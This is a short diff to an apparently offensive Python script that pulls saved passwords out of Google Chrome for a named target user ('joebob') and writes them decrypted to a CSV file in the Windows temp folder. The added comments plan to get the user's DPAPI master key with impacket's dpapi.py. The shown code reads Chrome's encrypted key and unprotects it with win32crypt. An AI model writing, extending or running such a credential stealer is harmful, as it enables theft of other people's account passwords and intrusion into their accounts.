@@ -9,6 +9,7 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 
+# Specify the target username here
 username = "joebob"
 writepath = "C:\\Windows\\temp\\decrypted_passwords.csv"
 
@@ -27,6 +28,8 @@ def get_secret_key():
         secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         #Remove suffix DPAPI
 
+        # The chrome secretkey is protected with the Windows DPAPI encryption. It must be decrypted using the user's masterkey
+        # I think we can extract this using dpapi.py from impacket and then import it here.
         # ---- import key DPAPI master key here ----
         secret_key = secret_key[5:] 
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
